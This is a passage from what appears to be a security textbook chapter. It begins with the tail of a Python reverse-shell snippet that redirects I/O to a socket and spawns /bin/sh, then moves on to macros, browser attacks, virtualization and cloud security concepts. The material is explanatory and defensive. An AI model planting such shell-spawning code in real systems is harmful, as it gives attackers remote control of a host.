os.dup2(s.fileno(),1)

os.dup2(s.fileno(),2)

pty.spawn("/bin/sh")'

The os.dup2 statements redirect the terminal's data streams stdin (0), stdout (1), and stderr (2) to the socket object (s). The pty module provides a library of functions for managing a pseudo-terminal, in this case starting the shell process at /bin/sh.

The code to implement a shell can be obfuscated in numerous ways. One way to identify malicious scripts trying to match code samples is to scan the file system against a configuration baseline, either using file integrity monitoring or use of the Linux diff command. 

A common exploit for a vulnerable web server is to upload a cryptominer, misusing the server's CPU resources to try to obtain new cryptocurrency. You can use Linux utilities such as top and free to diagnose excessive CPU and memory resource consumption by such malware.

This F5 white paper describes the use of Bash and Python attack tools ([f5.com/labs/articles/threat-intelligence/attackers-use-new--sophisticated-ways-to-install-cryptominers](https://www.f5.com/labs/articles/threat-intelligence/attackers-use-new--sophisticated-ways-to-install-cryptominers)).

MACROS AND VISUAL BASIC FOR APPLICATIONS (VBA)

A document macro is a sequence of actions performed in the context of a word processor, spreadsheet, or presentation file. While the user may be able to record macro steps using the GUI, ultimately macros are coded in a scripting language. Microsoft Office uses the Visual Basic for Applications (VBA) language, while PDF documents use JavaScript. Microsoft Office document macros can be inspected using ALT+F11. Other vendors and open-source software also implement macro functionality, using languages such as Basic or Python.

A malicious actor will try to use a macro-enabled document to execute arbitrary code. For example, a Word document could be the vector for executing a malicious PowerShell script. Macros are disabled by default in Office, but the attacker may be able to use a social engineering attack to get the user to change the policy.

With PDF, the JavaScript might be embedded within the document and designed to exploit a known vulnerability in the reader software to execute without authorization ([sentinelone.com/blog/malicious-pdfs-revealing-techniques-behind-attacks](https://www.sentinelone.com/blog/malicious-pdfs-revealing-techniques-behind-attacks/)).

MAN-IN-THE-BROWSER ATTACK

A man-in-the-browser (MitB) attack is a specific type of on-path attack where the web browser is compromised. Depending on the level of privilege obtained, the attacker may be able to inspect session cookies, certificates, and data, change browser settings, perform redirection, and inject code.

A MitB attack may be accomplished by installing malicious plug-ins or scripts or intercepting calls between the browser process and DLLs ([attack.mitre.org/techniques/T1185](https://attack.mitre.org/techniques/T1185/)). The Browser Exploitation Framework (BeEF) ([beefproject.com](https://beefproject.com/)) is one well known MitB tool. There are various vulnerability exploit kits that can be installed to a website to actively try to exploit vulnerabilities in clients browsing the site ([trendmicro.com/vinfo/ie/security/definition/exploit-kit](https://www.trendmicro.com/vinfo/ie/security/definition/exploit-kit)). These kits may either be installed to a legitimate site without the owner's knowledge (by compromising access control on the web server) and load in an iFrame (invisible to the user), or the attacker may use phishing/social engineering techniques to trick users into visiting the site.

The Browser Exploitation Framework (BeEF) uses a script to "hook" a browser. The tool can be used to inspect session data and inject code.

AUTOMATION/SCRIPTING RELEASE PARADIGMS

Coding projects are managed using different life cycle models. The waterfall model software development life cycle (SDLC) is an older paradigm that focuses on the successful completion of monolithic projects that progress from stage to stage. The more recent Agile paradigm uses iterative processes to release well-tested code in smaller blocks or units. In this model, development and provisioning tasks are conceived as continuous.
### Continuous Integration
Continuous integration (CI) is the principle that developers should commit and test updates often—every day or sometimes even more frequently. This is designed to reduce the chances of two developers spending time on code changes that are later found to conflict with one another. CI aims to detect and resolve these conflicts early, as it is easier to diagnose one or two conflicts or build errors than it is to diagnose the causes of tens of them. For effective CI, it is important to use an automated test suite to validate each build quickly.
### Continuous Delivery
Where CI is about managing code in development, continuous delivery is about testing all of the infrastructure that supports the app, including networking, database functionality, client software, and so on.
### Continuous Deployment
Where continuous delivery tests that an app version and its supporting infrastructure are ready for production, continuous deployment is the separate process of actually making changes to the production environment to support the new app version.

Automation and continuous release paradigms. (Images © 123RF.com.)
### Continuous Monitoring and Automated Courses of Action
An automation solution will have a system of continuous monitoring to detect service failures and security incidents. Continuous monitoring might use a locally installed agent or heartbeat protocol or may involve checking availability remotely. As well as monitoring the primary site, it is important to observe the failover components to ensure that they are recovery ready. You can also automate the courses of action that a monitoring system takes, like configuring an IPS to automatically block traffic that it deems suspicious. This sort of capability is provided by security orchestration and response (SOAR) management software.
### Continuous Validation
An application model is a statement of the requirements driving the software development project. The requirements model is tested using processes of verification and validation (V&V):

- Verification is a compliance testing process to ensure that the product or system meets its design goals.
- Validation is the process of determining whether the application is fit-for-purpose (so for instance, its design goals meet the user requirements).

With the continuous paradigm, feedback from delivery and deployment must be monitored and evaluated to ensure that the design goals continue to meet user and security requirements. The monitoring and validation processes must also ensure that there is no drift from the secure configuration baseline.

CLOUD SERVICE MODELS

As well as the ownership model (public, private, hybrid, or community), cloud services are often differentiated on the level of complexity and pre-configuration provided. These models are referred to as something or anything as a service (XaaS). The three most common implementations are infrastructure, software, and platform.
### Infrastructure as a Service
Infrastructure as a service (IaaS) is a means of provisioning IT resources such as servers, load balancers, and storage area network (SAN) components quickly. Rather than purchase these components and the Internet links they require, you rent them on an as-needed basis from the service provider's data center. Examples include Amazon Elastic Compute Cloud ([aws.amazon.com/ec2](https://aws.amazon.com/ec2/)), Microsoft Azure Virtual Machines ([azure.microsoft.com/services/virtual-machines](https://azure.microsoft.com/services/virtual-machines)), Oracle Cloud ([oracle.com/cloud](https://www.oracle.com/cloud/)), and OpenStack ([openstack.org](https://www.openstack.org/)).
### Software as a Service
Software as a service (SaaS) is a different model of provisioning software applications. Rather than purchasing software licenses for a given number of seats, a business would access software hosted on a supplier's servers on a pay-as-you-go or lease arrangement (on-demand). Virtual infrastructure allows developers to provision on-demand applications much more quickly than previously. The applications can be developed and tested in the cloud without the need to test and deploy on client computers. Examples include Microsoft Office 365 ([microsoft.com/en-us/microsoft-365/enterprise](https://www.microsoft.com/en-us/microsoft-365/enterprise)), Salesforce ([salesforce.com](https://www.salesforce.com/)), and Google G Suite ([gsuite.google.com](https://gsuite.google.com/)).
### Platform as a Service
Platform as a service (PaaS) provides resources somewhere between SaaS and IaaS. A typical PaaS solution would provide servers and storage network infrastructure (as per IaaS) but also provide a multi-tier web application/database platform on top. This platform could be based on Oracle or MS SQL or PHP and MySQL. Examples include Oracle Database ([oracle.com/database](https://www.oracle.com/database/)), Microsoft Azure SQL Database ([azure.microsoft.com/services/sql-database](https://azure.microsoft.com/services/sql-database)), and Google App Engine ([cloud.google.com/appengine](https://cloud.google.com/appengine)).

As distinct from SaaS though, this platform would not be configured to actually do anything. Your own developers would have to create the software (the CRM or ecommerce application) that runs using the platform. The service provider would be responsible for the integrity and availability of the platform components, but you would be responsible for the security of the application you created on the platform.

Dashboard for Amazon Web Services Elastic Compute Cloud (EC2) IaaS/PaaS. (Screenshot used with permission from [Amazon.com](https://www.amazon.com/).)

ANYTHING AS A SERVICE

There are many other examples of XaaS, reflecting the idea that anything can be provisioned as a cloud service. For example, database as a service and network as a service can be distinguished as more specific types of platform as a service. The key security consideration with all these models is identifying where responsibilities lie. This is often referred to as security in the cloud versus security of the cloud. Security in the cloud is the things you must take responsibility for; security of the cloud is the things the CSP manages. These responsibilities vary according to the service type:

|Responsibility|IaaS|PaaS|SaaS|
| :- | :- | :- | :- |
|IAM|You|You|You (using CSP toolset)|
|Data security (CIA attributes/backup)|You|You|You/CSP/Both|
|Data privacy|You/CSP/Both|You/CSP/Both|You/CSP/Both|
|Application code/configuration|You|You|CSP|
|Virtual network/firewall|You|You/CSP|CSP|
|Middleware (database) code/configuration|You|CSP|CSP|
|Virtual Guest OS|You|CSP|CSP|
|Virtualization layer|CSP|CSP|CSP|
|Hardware layer (compute, storage, networking)|CSP|CSP|CSP|
Note that this matrix identifies generic responsibilities only. Specific terms must be set out in a contract and service level agreement (SLA) with the CSP.

SECURITY AS A SERVICE

The breadth of technologies requiring specialist security knowledge and configuration makes it likely that companies will need to depend on third-party support at some point. You can classify such support in three general "tiers":

- Consultants—the experience and perspective of a third-party professional can be hugely useful in improving security awareness and capabilities in any type of organization (small to large). Consultants could be used for "big picture" framework analysis and alignment or for more specific or product-focused projects (pen testing, SIEM rollout, and so on). It is also fairly simple to control costs when using consultants if they are used to develop capabilities rather than implement them. Where consultants come to "own" the security function, it can be difficult to change or sever the relationship.
- Managed Security Services Provider (MSSP)—a means of fully outsourcing responsibility for information assurance to a third party. This type of solution is expensive but can be a good fit for a SMB that has experienced rapid growth and has no in-house security capability. Of course, this type of outsourcing places a huge amount of trust in the MSSP. Maintaining effective oversight of the MSSP requires a good degree of internal security awareness and expertise. There could also be significant challenges in industries exposed to high degrees of regulation in terms of information processing.
- Security as a Service (SECaaS)—can mean lots of different things, but is typically distinguished from an MSSP as being a means of implementing a particular security control, such as virus scanning or SIEM-like functionality, in the cloud. Typically, there would be a connector to the cloud service installed locally. For example, an antivirus agent would scan files locally but be managed and updated from the cloud provider; similarly a log collector would submit events to the cloud service for aggregation and correlation. Examples include Cloudflare ([cloudflare.com/saas](https://www.cloudflare.com/saas)), Mandiant/FireEye ([fireeye.com/mandiant/managed-detection-and-response.html](https://www.fireeye.com/mandiant/managed-detection-and-response.html)), and SonicWall ([sonicwall.com/solutions/service-provider/security-as-a-service](https://www.sonicwall.com/solutions/service-provider/security-as-a-service/)). 

VIRTUAL DESKTOP INFRASTRUCTURE AND THIN CLIENTS

Virtual desktop infrastructure (VDI) refers to using a VM as a means of provisioning corporate desktops. In a typical VDI, desktop computers are replaced by low-spec, low-power thin client computers. When the thin client starts, it boots a minimal OS, allowing the user to log on to a VM stored on the company server infrastructure. The user makes a connection to the VM using some sort of remote desktop protocol (Microsoft Remote Desktop or Citrix ICA, for instance). The thin client has to find the correct image and use an appropriate authentication mechanism. There may be a 1:1 mapping based on machine name or IP address or the process of finding an image may be handled by a connection broker.

All application processing and data storage in the virtual desktop environment (VDE) or workspace is performed by the server. The thin client computer must only be powerful enough to display the screen image, play audio, and transfer mouse, key commands and video, and audio information over the network. All data is stored on the server, so it is easier to back up and the desktop VMs are easier to support and troubleshoot. They are better "locked" against unsecure user practices because any changes to the VM can easily be overwritten from the template image. With VDI, it is also easier for a company to completely offload their IT infrastructure to a third-party services company.

The main disadvantage is that in the event of a failure in the server and network infrastructure, users have no local processing ability, so downtime events may be more costly in terms of lost productivity.

APPLICATION VIRTUALIZATION AND CONTAINER VIRTUALIZATION

Application virtualization is a more limited type of VDI. Rather than run the whole client desktop as a virtual platform, the client either accesses an application hosted on a server or streams the application from the server to the client for local processing. Most application virtualization solutions are based on Citrix XenApp (formerly MetaFrame/Presentation Server), though Microsoft has developed an App-V product with its Windows Server range and VMware has the ThinApp product. These solution types are now often used with HTML5 remote desktop apps, referred to as "clientless" because users can access them through ordinary web browser software.

Application cell/container virtualization dispenses with the idea of a hypervisor and instead enforces resource separation at the operating system level. The OS defines isolated "cells" for each user instance to run in. Each cell or container is allocated CPU and memory resources, but the processes all run through the native OS kernel. These containers may run slightly different OS distributions but cannot run guest OSes of different types (you could not run Windows or Ubuntu in a RedHat Linux container, for instance). Alternatively, the containers might run separate application processes, in which case the variables and libraries required by the application process are added to the container.

One of the best-known container virtualization products is Docker ([docker.com](https://www.docker.com/)). Containerization underpins many cloud services. In particular it supports microservices and serverless architecture. Containerization is also being widely used to implement corporate workspaces on mobile devices.

Comparison of VMs versus containers.

VM ESCAPE PROTECTION

VM escaping refers to malware running on a guest OS jumping to another guest or to the host. To do this, the malware must identify that it is running in a virtual environment, which is usually simple to do. One means of doing so is through a timing attack. The classic timing attack is to send multiple usernames to an authentication server and measure the server response times. An invalid username will usually be rejected very quickly, but a valid one will take longer (while the authentication server checks the password). This allows the attacker to harvest valid usernames. Malware can use a timing attack within a guest OS to detect whether it is running in a VM (certain operations may take a distinct amount of time compared to a "real" environment). There are numerous other "signatures" that an attacker could use to detect the presence of virtualized system hardware. The next step in VM escaping is for the attacker to compromise the hypervisor. Security researchers have been focusing on this type of exploit and several vulnerabilities have been found in popular hypervisors.

One serious implication of VM escaping is where virtualization is used for hosted applications. If you have a hosted web server, apart from trusting the hosting provider with your data, you have no idea what other applications might be running in other customers' VMs. For example, consider a scenario where you have an e-commerce web server installed on a virtual server leased from an ISP. If a third-party installs another guest OS with malware that can subvert the virtual server's hypervisor, they might be able to gain access to your server or to data held in the memory of the physical server. Having compromised the hypervisor, they could make a copy of your server image and download it to any location. This would allow the attacker to steal any unencrypted data held on the e-commerce server. Even worse, it could conceivably allow them to steal encrypted data, by obtaining the private encryption keys stored on the server or by sniffing unencrypted data or a data encryption key from the physical server's memory.

It is imperative to monitor security bulletins for the hypervisor software that you operate and to install patches and updates promptly. You should also design the VM architecture carefully so that the placement of VMs running different types of applications with different security requirements does not raise unnecessary risks.

Preventing VM escaping is dependent on the virtualization vendor identifying security vulnerabilities in the hypervisor and on these being patched. The impact of VM escaping can be reduced by using effective service design and network placement when deploying VMs.

Collapsing zones to virtualized devices—This configuration is highly vulnerable to a VM escaping attack. (Images © 123RF.com.)

For example, when considering security zones such as a DMZ, VMs providing front-end and middleware/back-end services should be separated to different physical hosts. This reduces the security implications of a VM escaping attack on a host in the DMZ (which will generally be more vulnerable to such attacks).

Isolating VMs in different zones on separate hardware—This should reduce the impact of a VM escaping attack. (Images © 123RF.com.)

VM SPRAWL AVOIDANCE

As well as securing the hypervisor, you must also treat each VM as you would any other network host. This means using security policies and controls to ensure the confidentiality, integrity, and availability of all data and services relying on host virtualization.

Each VM needs to be installed with its own security software suite to protect against malware and intrusion attempts. Each guest must also have a patch management process. This might mean installing updates locally or replacing the guest instance from an updated VM template image.

Ordinary antivirus software installed on the host will NOT detect viruses infecting the guest OS. Scanning the virtual disks of guest OSes from the host will cause serious performance problems.

Although one of the primary benefits of virtualization is the ease of deploying new systems, this type of system sprawl and deployment of undocumented assets can also be the root of security issues. It will often be the case that a system will be brought up for "just a minute" to test something, but languish for months or years, undocumented, unsecured, and unpatched. Each of these undocumented systems could represent an exploitable vulnerability. They increase the potential attack surface of the network. Policies and procedures for tracking, securing, and, when no longer used, destroying virtualized assets should be put in place and carefully enforced.

Virtual machine life cycle management (VMLM) software can be deployed to enforce VM sprawl avoidance. VMLM solutions provide you with a centralized dashboard for maintaining and monitoring all the virtual environments in your organization. More generally, the management procedures for developing and deploying machine images need to be tightly drafted and monitored. VMs should conform to an application-specific template with the minimum configuration needed to run that application (that is, not running unnecessary services). Images should not be run in any sort of environment where they could be infected by malware or have any sort of malicious code inserted. One of the biggest concerns here is of rogue developers or contractors installing backdoors or "logic bombs" within a machine image. The problem of criminal or disgruntled staff is obviously one that affects any sort of security environment, but concealing code within VM machine images is a bit easier to accomplish and has the potential to be much more destructive.

CLOUD SECURITY CONTROLS

Clouds use the same types of security controls as on-premises networks, including identity and access management (IAM), endpoint protection (for virtual instances), resource policies to govern access to data and services, firewalls to filter traffic between hosts, and logging to provide an audit function.

Most CSP's will provide these security controls as native functionality of the cloud platform. Google's firewall service is an example of this type of cloud-native control ([cloud.google.com/firewalls](https://cloud.google.com/firewalls)). The controls can be deployed and configured using either the CSP's web console, or programmatically via a command line interface (CLI) or application programming interface (API). A third-party solution would typically be installed as a virtual instance within the cloud. For example, you might prefer to run a third-party next-generation firewall. This can be configured as an appliance and deployed to the cloud. The virtual network architecture can be defined so that this appliance instance is able to inspect traffic and apply policies to it, either by routing the traffic through the instance or by using some type of bridging or mirroring. As an example, consider the configuration guide for the Barracuda next-gen firewall ([campus.barracuda.com/product/cloudgenfirewall/doc/79462645/overview](https://campus.barracuda.com/product/cloudgenfirewall/doc/79462645/overview)).

The same considerations can be made for other types of security controls—notably data loss prevention and compliance management. Cloud-native controls might not exist for these use cases, they might not meet the functional requirements that third-party solutions can, and there may be too steep a transition in terms of change management and skills development.
### Application Security and IAM
Application security in the cloud refers both to the software development process and to identity and access management (IAM) features designed to ensure authorized use of applications.

Just as with on-premises solutions, cloud-based IAM enables the creation of user and user security groups, plus role-based management of privileges.
### Secrets Management
A cloud service is highly vulnerable to remote access. A failure of credential management is likely to be exploited by malicious actors. You must enforce strong authentication policies to mitigate risks:

- Do not use the root user for the CSP account for any day-to-day logon activity.
- Require strong multifactor authentication (MFA) for interactive logons. Use conditional authentication to deny or warn of risky account activity.
- Principals—user accounts, security groups, roles, and services—can interact with cloud services via CLIs and APIs. Such programmatic access is enabled by assigning a secret key to the account. Only the secret key (not the ordinary account credential) can be used for programmatic access. When a secret key is generated for an account, it must immediately be transferred to the host and kept securely on that host.

CLOUD COMPUTE SECURITY

Cloud provides resources abstracted from physical hardware via one or more layers of virtualization. The compute component provides process and system memory (RAM) resource as required for a particular workload. The workload could be a virtual machine instance configured with four CPUs and 16 GB RAM or it could be a container instance spun up to perform a function and return a result within a given timeframe. The virtualization layer ensures that the resources required for this task are made available on-demand. This can be referred to as dynamic resource allocation. It will be the responsibility of the CSP to ensure this capability is met to the standards agreed in the SLA.

Within the compute component, the following critical security considerations can be identified.
### Container Security
A container uses many shared components on the underlying platform, meaning it must be carefully configured to reduce the risk of data exposure. In a container engine such as Docker, each container is isolated from others through separate namespaces and control groups ([docs.docker.com/engine/security/security](https://docs.docker.com/engine/security/security/)). Namespaces prevent one container reading or writing processes in another, while control groups ensure that one container cannot overwhelm others in a DoS-type attack.
### API Inspection and Integration
The API is the means by which consumers interact with the cloud infrastructure, platform, or application. The consumer may use direct API calls, or may use a CSP-supplied web console as a graphical interface for the API. Monitoring API usage gives warning if the system is becoming overloaded (ensuring availability) and allows detection of unauthorized usage or attempted usage.

- Number of requests—this basic load metric counts number of requests per second or requests per minute. Depending on the service type, you might be able to establish baselines for typical usage and set thresholds for alerting abnormal usage. An unexplained spike in API calls could be an indicator of a DDoS attack, for instance.
- Latency—this is the time in milliseconds (ms) taken for the service to respond to an API call. This can be measured for specific services or as an aggregate value across all services. High latency usually means that compute resources are insufficient. The cause of this could be genuine load or DDoS, however.
- Error rates—this measures the number of errors as a percentage of total calls, usually classifying error types under category headings. Errors may represent an overloaded system if the API is unresponsive, or a security issue, if the errors are authorization/access denied types.
- Unauthorized and suspicious endpoints—connections to the API can be managed in the same sort of way as remote access. The client endpoint initiating the connection can be restricted using an ACL and the endpoint's IP address monitored for geographic location.
### Instance Awareness
As with on-premises virtualization, it is important to manage instances (virtual machines and containers) to avoid sprawl, where undocumented instances are launched and left unmanaged. As well as restricting rights to launch instances, you should configure logging and monitoring to track usage.

HIGH AVAILABILITY

One of the benefits of the cloud is the potential for providing services that are resilient to failures at different levels, such as component, server, local network, site, data center, and wide area network. The CSP uses a virtualization layer to ensure that compute, storage, and network provision meet the availability criteria set out in its SLA. In terms of storage performance tiers, high availability (HA) refers to storage provisioned with a guarantee of 99.99% uptime or better. As with on-premises architecture, the CSP uses redundancy to make multiple disk controllers and storage devices available to a pool of storage resource. Data may be replicated between pools or groups, with each pool supported by separate hardware resources.
### Replication
Data replication allows businesses to copy data to where it can be utilized most effectively. The cloud may be used as a central storage area, making data available among all business units. Data replication requires low-latency network connections, security, and data integrity. CSPs offer several data storage performance tiers ([cloud.google.com/storage/docs/storage-classes](https://cloud.google.com/storage/docs/storage-classes)). The terms hot and cold storage refer to how quickly data is retrieved. Hot storage retrieves data more quickly than cold, but the quicker the data retrieval, the higher the cost. Different applications have diverse replication requirements. A database generally needs low-latency, synchronous replication, as a transaction often cannot be considered complete until it has been made on all replicas. A mechanism to replicate data files to backup storage might not have such high requirements, depending on the criticality of the data.
### High Availability across Zones
CSPs divide the world into regions. Each region is independent of the others. The regions are divided into availability zones. The availability zones have independent data centers with their own power, cooling, and network connectivity. You can choose to host data, services, and VM instances in a particular region to provide a lower latency service to customers. Provisioning resources in multiple zones and regions can also improve performance and increases redundancy, but requires an adequate level of replication performance.

Consequently, CSPs offer several tiers of replication representing different high availability service levels:

- Local replication—replicates your data within a single data center in the region where you created your storage account. The replicas are often in separate fault domains and upgrade domains.
- Regional replication (also called zone-redundant storage)—replicates your data across multiple data centers within one or two regions. This safeguards data and access in the event a single data center is destroyed or goes offline.
- Geo-redundant storage (GRS)—replicates your data to a secondary region that is distant from the primary region. This safeguards data in the event of a regional outage or a disaster.

VPCS AND TRANSIT GATEWAYS

Routing can be configured between subnets within a VPC. This traffic can be subject to cloud native ACLs allowing or blocking traffic on the basis of host IPs and ports. Alternatively, traffic could be routed through a virtual firewall instance, or other security appliance.

Connectivity can also be configured between VPCs in the same account or with VPCs belonging to different accounts, and between VPCs and on-premises networks. Configuring additional VPCs rather than subnets within a VPC allows for a greater degree of segmentation between instances. A complex network might split segments between different VPCs across different cloud accounts for performance or compliance reasons.

Traditionally, VPCs can be interconnected using peering relationships and connected with on-premises networks using VPN gateways. These one-to-one VPC peering relationships can quickly become difficult to manage, especially if each VPC must interconnect in a mesh-like structure. A transit gateway is a simpler means of managing these interconnections. Essentially, a transit gateway is a virtual router that handles routing between the subnets in each attached VPC and any attached VPN gateways ([aws.amazon.com/transit-gateway](https://aws.amazon.com/transit-gateway/)).

Amazon's white paper sets out options for configuring multi-VPC infrastructure in more detail ([d1.awsstatic.com/whitepapers/building-a-scalable-and-secure-multi-vpc-aws-network-infrastructure.pdf](https://wmx-api-production.s3.amazonaws.com/courses/5721/supplementary/building-a-scalable-and-secure-multi-vpc-aws-network-infrastructure.pdf)).

VPC ENDPOINTS

A VPC endpoint is a means of publishing a service so that it is accessible by instances in other VPCs using only the AWS internal network and private IP addresses ([d1.awsstatic.com/whitepapers/aws-privatelink.pdf](http://d1.awsstatic.com/whitepapers/aws-privatelink.pdf)). This means that the traffic is never exposed to the Internet. There are two types of VPC endpoint: gateway and interface.

Gateway Endpoints

A gateway endpoint is used to connect instances in a VPC to the AWS S3 (storage) and DynamoDB (database) services. A gateway endpoint is configured as a route to the service in the VPC's route table.

Interface Endpoints

An interface endpoint makes use of AWS's PrivateLink feature to allow private access to custom services:

- A custom service provider VPC is configured by publishing the service with a DNS host name. Alternatively, the service provider might be an Amazon default service that is enabled as a VPC interface endpoint, such as CloudWatch Events/Logs.
- A VPC endpoint interface is configured in each service consumer VPC subnet. The VPC endpoint interface is configured with a private IP address within the subnet plus the DNS host name of the service provider.
- Each instance within the VPC subnet is configured to use the endpoint address to contact the service provider.

CLOUD ACCESS SECURITY BROKERS

A cloud access security broker (CASB) is enterprise management software designed to mediate access to cloud services by users across all types of devices. CASB vendors include Blue Coat, now owned by Symantec ([broadcom.com/products/cyber-security/information-protection/cloud-application-security-cloudsoc](https://www.broadcom.com/products/cyber-security/information-protection/cloud-application-security-cloudsoc)), SkyHigh Networks, now owned by McAfee ([skyhighnetworks.com](https://www.skyhighnetworks.com/)), Forcepoint ([forcepoint.com/product/casb-cloud-access-security-broker](https://www.forcepoint.com/product/casb-cloud-access-security-broker)), Microsoft Cloud App Security ([microsoft.com/en-us/microsoft-365/enterprise-mobility-security/cloud-app-security](https://www.microsoft.com/en-us/microsoft-365/enterprise-mobility-security/cloud-app-security)), and Cisco Cloudlock ([cisco.com/c/en/us/products/security/cloudlock/index.html](https://www.cisco.com/c/en/us/products/security/cloudlock/index.html)).

CASBs provide you with visibility into how clients and other network nodes are using cloud services. Some of the functions of a CASB are:

- Enable single sign-on authentication and enforce access controls and authorizations from the enterprise network to the cloud provider.
- Scan for malware and rogue or non-compliant device access.
- Monitor and audit user and resource activity.
- Mitigate data exfiltration by preventing access to unauthorized cloud services from managed devices.

In general, CASBs are implemented in one of three ways:

- Forward proxy—this is a security appliance or host positioned at the client network edge that forwards user traffic to the cloud network if the contents of that traffic comply with policy. This requires configuration of users' devices or installation of an agent. In this mode, the proxy can inspect all traffic in real time, even if that traffic is not bound for sanctioned cloud applications. The problem with this mode is that users may be able to evade the proxy and connect directly. Proxies are also associated with poor performance as without a load balancing solution, they become a bottleneck and potentially a single point of failure.
- Reverse proxy—this is positioned at the cloud network edge and directs traffic to cloud services if the contents of that traffic comply with policy. This does not require configuration of the users' devices. This approach is only possible if the cloud application has proxy support.
- Application programming interface (API)—rather than placing a CASB appliance or host inline with cloud consumers and the cloud services, an API-based CASB brokers connections between the cloud service and the cloud consumer. For example, if a user account has been disabled or an authorization has been revoked on the local network, the CASB would communicate this to the cloud service and use its API to disable access there too. This depends on the API supporting the range of functions that the CASB and access and authorization policies demand. CASB solutions are quite likely to use both proxy and API modes for different security management purposes.
### Next-Generation Secure Web Gateway
Enterprise networks often make use of secure web gateways (SWG). An on-premises SWG is a proxy-based firewall, content filter, and intrusion detection/prevention system that mediates user access to Internet sites and services. A next-generation SWG, as marketed by Netskope ([netskope.com/products/next-gen-swg](https://www.netskope.com/products/next-gen-swg)), combines the functionality of an SWG with that of data loss prevention (DLP) and a CASB to provide a wholly cloud-hosted platform for client access to websites and cloud apps. This supports an architecture defined by Gartner as secure access service edge (SASE) (<https://www.paloaltonetworks.com/cyberpedia/what-is-sase>).

SERVICES INTEGRATION AND MICROSERVICES

In the early days of computer networks, architecture was focused on the provision of server machines and intermediate network systems (switches and routers). Architectural choices centered around where to place a "box" to run monolithic network applications such as routing, security, address allocation, name resolution, file sharing, email, and so on. With virtualization, the provision of these applications is much less dependent on where you put the box and the OS that the box runs. Virtualization helps to make the design architecture fit to the business requirement rather than accommodate the business workflow to the platform requirement.
### Service-Oriented Architecture (SOA)
Service-oriented architecture (SOA) conceives of atomic services closely mapped to business workflows. Each service takes defined inputs and produces defined outputs. The service may itself be composed of sub-services. The key features of a service function are that it is self-contained, does not rely on the state of other services, and exposes clear input/output (I/O) interfaces. Because each service has a simple interface, interoperability is made much easier than with a complex monolithic application. The implementation of a service does not constrain compatibility choices for client services, which can use a different platform or development language. This independence of the service and the client requesting the service is referred to as loose coupling. 
### Microservices
Microservice-based development shares many similarities with Agile software project management and the processes of continuous delivery and deployment. It also shares roots with the Unix philosophy that each program or tool should do one thing well. The main difference between SOA and microservices is that SOA allows a service to be built from other services. By contrast, each microservice should be capable of being developed, tested, and deployed independently. The microservices are said to be highly decoupled rather than just loosely decoupled. 
### Services Integration and Orchestration
Services integration refers to ways of making these decoupled service or microservice components work together to perform a workflow. Where SOA used the concept of an enterprise service bus, microservices integration and cloud services/virtualization/automation integration generally is very often implemented using orchestration tools. Where automation focuses on making a single, discrete task easily repeatable, orchestration performs a sequence of automated tasks. For example, you might orchestrate adding a new VM to a load-balanced cluster. This end-to-end process might include provisioning the VM, configuring it, adding the new VM to the load-balanced cluster, and reconfiguring the load-balancing weight distribution given the new cluster configuration. In doing this, the orchestrated steps would have to run numerous automated scripts or API service calls.

For orchestration to work properly, automated steps must occur in the right sequence, taking dependencies into account; it must provide the right security credentials at every step along the way; and it must have the rights and permissions to perform the defined tasks. Orchestration can automate processes that are complex, requiring dozens or hundreds of manual steps.

Cloud orchestration platforms connect to and provide administration, management, and orchestration for many popular cloud platforms and services. One of the advantages of using a third-party orchestration platform is protection from vendor lock in. If you wish to migrate from one cloud provider to another, or wish to move to a multi-cloud environment, automated workflows can often be adapted for use on new platforms. Industry leaders in this space include Chef ([chef.io](https://www.chef.io/)), Puppet ([puppet.com](https://puppet.com/)), Ansible ([ansible.com](https://www.ansible.com/)), and Kubernetes ([kubernetes.io](https://kubernetes.io/)).

SERVERLESS ARCHITECTURE

Serverless is a modern design pattern for service delivery. It is strongly associated with modern web applications—most notably Netflix ([aws.amazon.com/solutions/case-studies/netflix-and-aws-lambda](https://aws.amazon.com/solutions/case-studies/netflix-and-aws-lambda/))—but providers are appearing with products to completely replace the concept of the corporate LAN. With serverless, all the architecture is hosted within a cloud, but unlike "traditional" virtual private cloud (VPC) offerings, services such as authentication, web applications, and communications aren't developed and managed as applications running on VM instances located within the cloud. Instead, the applications are developed as functions and microservices, each interacting with other functions to facilitate client requests. When the client requires some operation to be processed, the cloud spins up a container to run the code, performs the processing, and then destroys the container. Billing is based on execution time, rather than hourly charges. This type of service provision is also called function as a service (FaaS). FaaS products include AWS Lambda ([aws.amazon.com/lambda](https://aws.amazon.com/lambda/)), Google Cloud Functions ([cloud.google.com/functions](https://cloud.google.com/functions)), and Microsoft Azure Functions ([azure.microsoft.com/services/functions](https://azure.microsoft.com/en-us/services/functions/)).

The serverless paradigm eliminates the need to manage physical or virtual server instances, so there is no management effort for software and patches, administration privileges, or file system security monitoring. There is no requirement to provision multiple servers for redundancy or load balancing. As all of the processing is taking place within the cloud, there is little emphasis on the provision of a corporate network. This underlying architecture is managed by the service provider. The principal network security job is to ensure that the clients accessing the services have not been compromised in a way that allows a malicious actor to impersonate a legitimate user. This is a particularly important consideration for the developer accounts and devices used to update the application code underpinning the services. These workstations must be fully locked down, running no other applications or web code than those necessary for development.

Serverless does have considerable risks. As a new paradigm, use cases and best practices are not mature, especially as regards security. There is also a critical and unavoidable dependency on the service provider, with limited options for disaster recovery should that service provision fail.

Serverless architecture depends heavily on the concept of event-driven orchestration to facilitate operations. For example, when a client connects to an application, multiple services will be called to authenticate the user and device, identify the device location and address properties, create a session, load authorizations for the action, use application logic to process the action, read or commit information from a database, and write a log of the transaction. This design logic is different from applications written to run in a "monolithic" server-based environment. This means that adapting existing corporate software will require substantial development effort.

INFRASTRUCTURE AS CODE

The use of cloud technologies encourages the use of scripted approaches to provisioning, rather than manually making configuration changes, or installing patches. An approach to infrastructure management where automation and orchestration fully replace manual configuration is referred to as infrastructure as code (IaC).

One of the goals of IaC is to eliminate snowflake systems. A snowflake is a configuration or build that is different from any other. The lack of consistency—or drift—in the platform environment leads to security issues, such as patches that have not been installed, and stability issues, such as scripts that fail to run because of some small configuration difference. By rejecting manual configuration of any kind, IaC ensures idempotence. Idempotence means that making the same call with the same parameters will always produce the same result. Note that IaC is not simply a matter of using scripts to create instances. Running scripts that have been written ad hoc is just as likely to cause environment drift as manual configuration. IaC means using carefully developed and tested scripts and orchestration runbooks to generate consistent builds.

FOG AND EDGE COMPUTING

